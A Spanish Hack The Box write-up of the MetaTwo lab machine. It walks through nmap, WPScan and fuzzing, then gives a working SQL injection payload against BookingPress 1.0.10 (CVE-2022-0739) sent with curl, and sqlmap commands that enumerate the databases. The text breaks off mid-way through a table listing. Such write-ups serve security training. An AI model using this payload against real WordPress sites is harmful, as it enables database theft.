---
title: "MetaTwo - Hack The Box"
date: 2023-04-14
draft: false
slug: "htb-writeup-metatwo"
excerpt: "Una máquina bastante complicada, otra que debería ser nivel medio, más no fácil. Usaremos el servicio HTTP para poder encontrar una forma de ganar acceso a la máquina, siendo que el código fuente nos ayudara a encontrar un plugin llamado Bookingpress, con el cual nos apoyaremos para capturar una petición usando curl y mandándola a BurpSuite, para después poder enumerar la base de datos de la página con sqlmap, capturando las credenciales en forma de hashes. Una vez las descifremos, entraremos al login del WordPress y en base a la versión, vamos a usar el Exploit CVE-2021-29447 para cargar un Payload en formato **.wav** para que con PHP podamos descifrar las credenciales del servicio FTP que tiene la máquina. Adentro del FTP encontraremos las credenciales para el servicio SSH, nos logueamos como usuario y después de investigar que hay dentro de este servicio, usaremos Passpie para poder exportar la contraseña del Root."
categories: ["HackTheBox", "Easy Machine"]
tags: ["Linux", "Virtual Hosting", "Web Enumeration", "Bookingpress", "Fuzzing", "Unauthenticated SQL Injection (USI)", "CVE-2022-0739 (USI)", "Cracking Hash", "WordPress", "Authenticated XXE", "CVE-2021-29447 (Authenticated XXE)", "FTP Enumeration", "SSH Enumeration", "Passpie", "Cracking SSH Key", "Privesc - Abusing Passpie Credentials", "OSCP Style", "Metasploit Framework"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "wpscane"
  - "wfuzz"
  - "gobuster"
  - "grep"
  - "curl"
  - "searchsploit"
  - "sqlmap"
  - "burpsuite"
  - "metasploit framework(msfconsole)"
  - "Módulo: auxiliary/gather/wp_bookingpress_category_services_sqli"
  - "johntheripper"
  - "hashcat"
  - "python3"
  - "echo"
  - "ftp"
  - "php"
  - "get"
  - "ssh"
  - "gpg2john"
links:
  - "https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357"
  - "https://backtrackacademy.com/articulo/ataque-de-una-base-de-datos-con-sqlmap"
  - "https://keepcoding.io/blog/como-usar-sqlmap/"
  - "https://geekflare.com/es/password-cracking-with-hashcat/"
  - "https://ikasten.io/2017/01/24/ssh-vault-cifrar-y-descifrar-un-fichero-usando-la-clave-ssh/"
  - "https://www.kolibers.com/blog/hash_cracking_con_john_the_ripper.html"
  - "https://github.com/motikan2010/CVE-2021-29447"
  - "https://tryhackme.com/room/wordpresscve202129447"
  - "https://vulners.com/kitploit/KITPLOIT:7430529944893678297"
  - "https://passpie.readthedocs.io/en/latest/"
  - "https://usersinsights.com/wordpress-user-database-tables/"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-metatwo/metatwo_logo.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está conectada y en base al TTL sabremos que SO opera en dicha máquina.
```bash
ping -c 4 10.10.11.186   
PING 10.10.11.186 (10.10.11.186) 56(84) bytes of data.
64 bytes from 10.10.11.186: icmp_seq=1 ttl=63 time=3143 ms
64 bytes from 10.10.11.186: icmp_seq=2 ttl=63 time=2117 ms
64 bytes from 10.10.11.186: icmp_seq=3 ttl=63 time=1094 ms
64 bytes from 10.10.11.186: icmp_seq=4 ttl=63 time=132 ms

--- 10.10.11.186 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3079ms
rtt min/avg/max/mdev = 132.257/1621.341/3142.807/1124.246 ms, pipe 4
```
Gracias al TTL sabemos que la máquina usa Linux, ahora hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.186 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-14 11:24 CST
Initiating SYN Stealth Scan at 11:24
Scanning 10.10.11.186 [65535 ports]
Discovered open port 80/tcp on 10.10.11.186
Discovered open port 22/tcp on 10.10.11.186
Discovered open port 21/tcp on 10.10.11.186
Completed SYN Stealth Scan at 11:24, 27.28s elapsed (65535 total ports)
Nmap scan report for 10.10.11.186
Host is up, received user-set (0.86s latency).
Scanned at 2023-04-14 11:24:19 CST for 27s
Not shown: 53078 filtered tcp ports (no-response), 12454 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.50 seconds
           Raw packets sent: 125650 (5.529MB) | Rcvd: 12533 (501.380KB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Veo que solamente hay 3 puertos abiertos, los clásicos para Linux cómo el puerto del **servicio SSH** y el **servicio HTTP**, pero me llama la atención ver que hay un **servicio FTP** activo. Recordemos esto para después, ahora hagamos el escaneo de servicios.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sC -sV -p21,22,80 10.10.11.186 -oN targeted                        
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-14 11:26 CST
Nmap scan report for 10.10.11.186
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp?

| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)

| ssh-hostkey: 
|   3072 c4b44617d2102d8fec1dc927fecd79ee (RSA)
|   256 2aea2fcb23e8c529409cab866dcd4411 (ECDSA)
|_  256 fd78c0b0e22016fa050debd83f12a4ab (ED25519)
80/tcp open  http    nginx 1.18.0

|_http-title: Did not follow redirect to http://metapress.htb/
|_http-server-header: nginx/1.18.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.93%I=7%D=4/14%Time=64398CC4%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,8F,"220\x20ProFTPD\x20Server\x20\(Debian\)\x20\[::ffff:10\.10\
SF:.11\.186\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20cre
SF:ative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creative
SF:\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 213.26 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Bien, me sigue pareciendo raro ver ese **servicio FTP** y como nos dice el escaneo, no está activo el login como **Anonymous** y de momento no tenemos credenciales para el **servicio SSH**, así que vamos a irnos por la página web del **servicio HTTP**.

OJO, vemos que la página web usa el **servicio Nginx**, esto quizá nos sirva después, analicemos la página web.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos.

![](/assets/images/htb-writeup-metatwo/Captura1.png)

No podemos ver nada, ya sabes que es lo que tenemos que hacer. Entra al **/etc/hosts** y agrega la IP y el nombre del dominio:
```bash
nano /etc/hosts
10.10.11.186 metapress.htb
```

Recarga la página y ya debería verse:

![](/assets/images/htb-writeup-metatwo/Captura2.png)

Veamos que nos dice el **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-metatwo/Captura3.png">
</p>

Interesante, usa **WordPress** y está hecha en **PHP**, además utiliza **MySQL** para su base de datos, tengamos en cuenta esta información. Ahora veamos que tiene la página que nos pueda servir.

![](/assets/images/htb-writeup-metatwo/Captura5.png)

Ojito que tenemos un usuario, quizá nos sirva para más adelante. Sigamos viendo que más hay.

![](/assets/images/htb-writeup-metatwo/Captura6.png)

La página principal nos menciona que podemos agendar una cita para un **Evento**, intentemos registrarnos a ver si nos da algo útil. 

![](/assets/images/htb-writeup-metatwo/Captura7.png)

![](/assets/images/htb-writeup-metatwo/Captura8.png)

![](/assets/images/htb-writeup-metatwo/Captura9.png)

No pues no, de ahí en fuera, no veo nada que nos pueda ayudar. Antes de aplicar un **Fuzzing**, veamos que es lo que nos puede dar la herramienta **WPScan** pues ya vimos que esta usando **WordPress**, quiza encuentre algo útil.

### Usando Herramienta WPScan {#WPScan}

Vamos a ejecutar esta herramienta sin otro parámetro más que la URL, veamos si encuentra algo:
```bash
wpscan --url http://metapress.htb
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://metapress.htb/ [10.10.11.186]

Interesting Finding(s):

[+] Headers

 | Interesting Entries:
 |  - Server: nginx/1.18.0
 |  - X-Powered-By: PHP/8.0.24
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://metapress.htb/robots.txt

 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://metapress.htb/xmlrpc.php

 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://metapress.htb/readme.html

 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://metapress.htb/wp-cron.php

 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.6.2 identified (Insecure, released on 2021-02-22).

 | Found By: Rss Generator (Passive Detection)
 |  - http://metapress.htb/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>
 |  - http://metapress.htb/comments/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>

[+] WordPress theme in use: twentytwentyone

 | Location: http://metapress.htb/wp-content/themes/twentytwentyone/
 | Readme: http://metapress.htb/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 2.2
 | Style URL: http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:14 <=====================================> (137 / 137) 100.00% Time: 00:00:14

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished
[+] Requests Done: 180
[+] Cached Requests: 7
[+] Data Sent: 50.866 KB
[+] Data Received: 18.42 MB
[+] Memory used: 275.09 MB
[+] Elapsed time: 00:00:32
```

De momento no encontro nada que nos pueda ser de mucha utilidad y que no hayamos visto ya, por ejemplo, la versión del **WordPress** y **PHP** nos la dio el **Wappalizer**. Pero, podemos utilizar esta herramienta de una forma un poco más activa y agresiva, vamos a dejarla en segundo plano.
```bash
wpscan --url http://metapress.htb --detection-mode aggressive --plugins-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://metapress.htb/ [10.10.11.186]

[i] Plugin(s) Identified:

[+] bookingpress-appointment-booking

 | Location: http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/
 | Readme: http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/readme.txt
 | [!] The version is out of date, the latest version is 1.1.6
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/, status: 200
 |
 | Version: 1.0.10 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/readme.txt
 | Confirmed By: Translation File (Aggressive Detection)
 |  - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/languages/bookingpress-appointment-booking-en_US.po, Match: 'sion: BookingPress Appointment Booking v1.0.10'

[+] feed

 | Location: http://metapress.htb/wp-content/plugins/feed/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://metapress.htb/wp-content/plugins/feed/, status: 200
 |
 | The version could not be determined.

[+] leira-roles

 | Location: http://metapress.htb/wp-content/plugins/leira-roles/
 | Last Updated: 2024-02-22T17:23:00.000Z
 | Readme: http://metapress.htb/wp-content/plugins/leira-roles/README.txt
 | [!] The version is out of date, the latest version is 1.1.9
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://metapress.htb/wp-content/plugins/leira-roles/, status: 200
 |
 | Version: 1.1.8.0 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://metapress.htb/wp-content/plugins/leira-roles/README.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://metapress.htb/wp-content/plugins/leira-roles/README.txt
```
Observa que obtuvo 3 plugins que pueden ser vulnerables, aunque el que si identifico como potencial es el **bookingpress-appointment-booking** y el **leira-roles**, esto nos puede ser útil más adeltante.

Hagamos un **Fuzzing** para ver que encontramos.

### Fuzzing {#Fuzz}

```bash
wfuzz -L -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://metapress.htb/FUZZ/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://metapress.htb/FUZZ/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                               
=====================================================================

000000126:   200        50 L     114 W      1763 Ch     "feed"                                                                
000000124:   200        155 L    552 W      10342 Ch    "0"                                                                   
000000062:   200        1033 L   3343 W     74116 Ch    "events"                                                              
000000053:   200        96 L     429 W      6931 Ch     "login"                                                               
000000241:   200        0 L      0 W        0 Ch        "wp-content"                                                          
000000037:   200        50 L     114 W      1763 Ch     "rss"                                                                 
000000026:   200        153 L    534 W      10326 Ch    "about"                                                               
000000014:   200        155 L    552 W      10342 Ch    "http://metapress.htb/"                                               
000000169:   200        47 L     115 W      1713 Ch     "atom"                                                                
000000187:   200        170 L    682 W      11441 Ch    "s"                                                                   
000000198:   200        153 L    534 W      10326 Ch    "a"                                                                   
000000260:   200        192 L    642 W      13791 Ch    "t"                                                                   
000000210:   200        164 L    567 W      10782 Ch    "c"                                                                   
000000259:   200        96 L     429 W      6931 Ch     "admin"                                                               
000000391:   200        1033 L   3343 W     74116 Ch    "e"                                                                   
000000786:   403        7 L      9 W        153 Ch      "wp-includes"
...
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-L*       | Para que wfuzz siga las redirecciones que surjan en el fuzzing. |

Saca muchas cosas que no veo útiles de momento, hagamos otro **Fuzzing** enfocado a **PHP**:
```bash
wfuzz -L -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://metapress.htb/FUZZ.php/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://metapress.htb/FUZZ.php/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                               
=====================================================================

000000015:   200        155 L    552 W      10342 Ch    "index"                                                               
000000475:   200        96 L     429 W      6931 Ch     "wp-login"                                                            
000000978:   200        98 L     441 W      7073 Ch     "wp-register"                                                         
000001281:   200        50 L     114 W      1763 Ch     "wp-rss2"                                                             
000014699:   200        47 L     115 W      1713 Ch     "wp-atom"                                                             
000016863:   200        21 L     39 W       727 Ch      "wp-commentsrss2"                                                     
000020169:   200        50 L     107 W      1764 Ch     "wp-rdf"                                                              
000026014:   200        50 L     114 W      1763 Ch     "wp-rss"                                                              
000029188:   404        153 L    519 W      9944 Ch     "okladki"                                                   
000029187:   404        153 L    519 W      9944 Ch     "veronica-mars"                                             
000029184:   404        153 L    519 W      9944 Ch     "pest"                                                      
000029186:   404        153 L    519 W      9944 Ch     "vicodin-buy"                                               
000029728:   200        50 L     114 W      1763 Ch     "wp-feed"
...
```

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://metapress.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x php | grep '.php'
[+] Extensions:              php
/index.php            (Status: 301) [Size: 0] [--> http://metapress.htb/]
/login                (Status: 302) [Size: 0] [--> http://metapress.htb/wp-login.php]
/wp-login.php         (Status: 200) [Size: 6931]
/xmlrpc.php           (Status: 405) [Size: 42]
/wp-signup.php        (Status: 302) [Size: 0] [--> http://metapress.htb/wp-login.php?action=register]
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*	     | Para indicar una extensión especifica a buscar. |

En este caso, usamos también **grep** para que nos muestre unicamente resultados con extensión **PHP**, pues nos mostraba otros resultados si lo dejaba correr sin el **grep**.

Tampoco muestra algo que nos ayude mucho, si intentas meter algunas de las subpáginas que se encontraron, se te descargaran unos archivos, pero no sirven de nada. Lo único que falta es analizar el código fuente de la página web para ver si hay algo ahí.

### Analizando Código Fuente de Página Web {#Fuente}

Investigando el código fuente de algunas subpáginas que tiene la página web, lo que me llama la atención es que hay un servicio llamado **Atom** y **Bookingpress**, siendo este último un plugin que ya vimos como un potencial plugin vulnerable con la herramienta **WPScan**, investiguemos de que se tratan estos dos.

Primero veamos **Atom**:

| **Atom** |
|:-----------:|
| *Atom era un editor de código fuente de código abierto para macOS, Linux, y Windows con soporte para múltiples plug-in escritos en Node.js y control de versiones Git integrado, desarrollado por GitHub. Atom es una aplicación de escritorio construida utilizando tecnologías web.* |

Si buscamos un Exploit para este servicio, encontraremos este:
```bash
searchsploit atom              
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path

|---|---|
Adobe Flash - Heap Use-After-Free in SurfaceFilterList::CreateFromScriptAtom                      | windows/dos/37884.txt
Adobe Reader X 10.0.0 < 10.0.1 - Atom Type Confusion                                                 | windows/local/17473.txt
Apple QuickTime - CRGN Atom Local Crash                                                              | linux/dos/8960.py
Apple QuickTime - Image Description Atom Sign Extension (PoC)                                        | windows/dos/8862.txt
Apple QuickTime 7 - Invalid Atom Length Buffer Overflow (Metasploit)                                 | windows/remote/27012.rb
Atom CMS 2.0 - Remote Code Execution (RCE)                                                           | php/webapps/50840.py
Atom Photoblog 1.0.1/1.0.9 - 'AtomPhotoblog.php' Multiple Input Validation Vulnerabilities           | php/webapps/30161.txt
Atom Photoblog 1.1.5b1 - 'photoId' SQL Injection                                                     | php/webapps/6125.txt
AtomatiCMS - Upload Arbitrary File                                                                   | asp/webapps/15139.txt
AtomCMS - SQL Injection / Arbitrary File Upload                                                      | php/webapps/39238.txt
AtomCMS v2.0 - SQLi                                                                                  | php/webapps/50727.txt
Atomic Alarm Clock 6.3 - Stack Overflow (Unicode+SEH)                                                | windows/local/48346.py
...
```
No creo que esto nos sirva de mucho, entonces veamos el otro servicio.

Ahora investiguemos el servicio **Bookingpress**:

| **Bookingpress** |
|:-----------:|
| *BookingPress es el único complemento de reserva de WordPress que proporciona 34+ premium add-ons completely free de cargo.* |

Ok, la diferencia con el servicio **Atom** es que aquí tenemos una versión que encontramos en la subpágina de citas del **Evento**:

![](/assets/images/htb-writeup-metatwo/Captura10.png)

Vemos que es el servicio **Bookingpress 1.0.10**, busquemos un Exploit.

#### Buscando un Exploit para Bookingpress {#Fuente2}

Aquí hay algo:
* <a href="https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357" target="_blank">BookingPress < 1.0.11 - Unauthenticated SQL Injection</a>

Esta es una vulnerabilidad de este puglin de **WordPress** con la que, por lo que entiendo, va a capturar información de la **base de datos de SQL**, es decir, que vamos a hacer **SQL Injection**.

Vamos a usar la herramienta **curl** con el ejemplo que nos pone el blog, ahí usaremos una función llamada **_wpnonce=** que viene en la página de la que sacamos el plugin **Bookingpress**.

![](/assets/images/htb-writeup-metatwo/Captura11.png)

La copiamos y la cambiamos, así debería quedar el comando:
```bash
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=948dbceb26&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
```

Lo activamos y nos tiene que mandar lo siguiente:
```json
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=948dbceb26&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -' 
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Fri, 14 Apr 2023 20:10:35 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.0.24
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
X-Frame-Options: SAMEORIGIN
Referrer-Policy: strict-origin-when-cross-origin

[{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"2","bookingpress_service_duration_unit":"3","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]
```

Vamos a modificarlo un poco para que se vea mejor la información que se obtuvo de este **curl**, esto eliminando las cabeceras y quedaría así:
```json
curl -s -q 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=3aae7c8d8b&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -' | jq .
[
  {
    "bookingpress_service_id": "10.5.15-MariaDB-0+deb11u1",
    "bookingpress_category_id": "Debian 11",
    "bookingpress_service_name": "debian-linux-gnu",
    "bookingpress_service_price": "$1.00",
    "bookingpress_service_duration_val": "2",
    "bookingpress_service_duration_unit": "3",
    "bookingpress_service_description": "4",
    "bookingpress_service_position": "5",
    "bookingpress_servicedate_created": "6",
    "service_price_without_currency": 1,
    "img_url": "http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/images/placeholder-img.jpg"
  }
]
```

Muy bien, si observamos bien el resultado, nos ha dado algo de información como la versión del **MySQL** y me parece que la versión del sistema operativo de la máquina, si queremos capturar datos deberemos usar la herramienta **SQLMAP** y usaremos mandaremos la captura de petición del **curl** al **BurpSuite**, luego al **Repeater** y copiaremos esa petición en un archivo. Hagámoslo por pasos.

## Explotación de Vulnerabilidades {#Explotacion}

### Realizando SQL Injection con SQLMAP {#SQL}

* Activamos **BurpSuite** y activamos la captura del proxy.

* Entonces, agregamos lo siguiente al comando anterior **-x http://127.0.0.1:8080/** y así debería quedar:
```bash
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=948dbceb26&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -' -x http://127.0.0.1:8080/
```

* Lo activamos y ya nos debería dar un resultado en **BurpSuite**, lo mandamos al **Repeater** y así se debería ver:

![](/assets/images/htb-writeup-metatwo/Captura12.png)

* Vamos a copiar ese resultado:

<p align="center">
<img src="/assets/images/htb-writeup-metatwo/Captura13.png">
</p>

* Y lo vamos a pegar en un archivo:
```bash
nano admin.req
```

Muy bien, ahora usemos la herramienta **sqlmap**. Aquí te dejo unos links con información básica sobre esta herramienta:
* <a href="https://backtrackacademy.com/articulo/ataque-de-una-base-de-datos-con-sqlmap" target="_blank">Ataque de una Base de Datos con SQLMap</a>
* <a href="https://keepcoding.io/blog/como-usar-sqlmap/" target="_blank">Cómo usar SQLmap</a>

Ahora hagamos por pasos la captura:

* Con el siguiente comando de **sqlmap** vamos a averiguar las bases de datos que existen en la página web, a todo dale que si:
```bash
sqlmap -r admin.req -p total_service --dbs
        ___
       __H__                                                                                                                           
 ___ ___[(]_____ ___ ___  {1.7.2#stable}                                                                                               

|_ -| . [)]     | .'| . |                                                                                                              
|___|_  [)]_|_|_|__,|  _|                                                                                                              
      |_|V...       |_|   https://sqlmap.org                                                                                           
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
[*] starting @ 14:20:34 /2023-04-14/
[14:20:34] [INFO] parsing HTTP request from 'admin.req'
...
```

* Nos descubrió dos bases de datos:
```bash
---
[14:21:20] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.0.24, Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[14:21:20] [INFO] fetching database names
available databases [2]:
[*] blog
[*] information_schema
[14:21:20] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/metapress.htb'
[*] ending @ 14:21:20 /2023-04-14/
```

* Ahora vamos a investigar estas bases, vamos primero por la BD llamada **blog**:
```bash
sqlmap -r admin.req -p total_service -D blog --tables
        ___
       __H__                                                                                                                           
 ___ ___[,]_____ ___ ___  {1.7.2#stable}                                                                                               

|_ -| . [)]     | .'| . |                                                                                                              
|___|_  ["]_|_|_|__,|  _|                                                                                                              
      |_|V...       |_|   https://sqlmap.org                                                                                           
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
[*] starting @ 14:21:59 /2023-04-14/
[14:21:59] [INFO] parsing HTTP request from 'admin.req'
[14:21:59] [WARNING] it appears that you have provided tainted parameter values ('total_service=-7502') with most likely leftover chars/statements from manual SQL injection test(s). Please, always use only valid parameter values so sqlmap could be able to run properly
are you really sure that you want to continue (sqlmap could have problems)? [y/N] y
[14:22:02] [INFO] resuming back-end DBMS 'mysql' 
[14:22:02] [INFO] testing connection to the target URL
...
```

* Nos encontró las siguientes tablas:
```bash
---
[14:22:02] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.0.24, Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[14:22:02] [INFO] fetching tables for database: 'blog'
Database: blog
[27 tables]
+--------------------------------------+

| wp_bookingpress_appointment_bookings |
| wp_bookingpress_categories           |
| wp_bookingpress_customers            |
| wp_bookingpress_customers_meta       |
| wp_bookingpress_customize_settings   |
| wp_bookingpress_debug_payment_log    |
| wp_bookingpress_default_daysoff      |
| wp_bookingpress_default_workhours    |
